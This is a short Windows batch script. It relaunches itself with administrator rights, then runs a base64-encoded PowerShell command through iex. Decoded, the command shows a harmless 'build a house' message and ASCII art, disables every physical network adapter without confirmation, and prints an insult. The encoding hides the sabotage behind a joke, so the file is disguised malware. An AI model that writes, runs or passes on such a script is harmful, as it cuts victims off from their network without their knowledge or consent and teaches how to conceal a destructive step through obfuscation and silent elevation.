@echo off
net session >nul 2>&1 || (powershell -Command "Start-Process '%0' -Verb RunAs" & exit /b)
set "code=ZWNobyBUaW1lIHRvIGJ1aWxkIGEgaG91c2UuLi47IGVjaG8gIiAgICAgICAgIC8iOyBlY2hvICIgICAgICAgIC8gIFwiOyBlY2hvICIgICAgICAgL19fX19cIjsgZWNobyAiICAgICAgIHwgW10gfCI7IGVjaG8gIiAgICAgICB8ICBfIHwiOyBlY2hvICIgICAgICAgfF98X3xffCI7IEdldC1OZXRBZGFwdGVyIC1QaHlzaWNhbCB8IERpc2FibGUtTmV0QWRhcHRlciAtQ29uZmlybTokZmFsc2U7IGVjaG8gIkZ1Y2sgeW91LiI="
powershell -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%code%')) | iex"
timeout /t 3
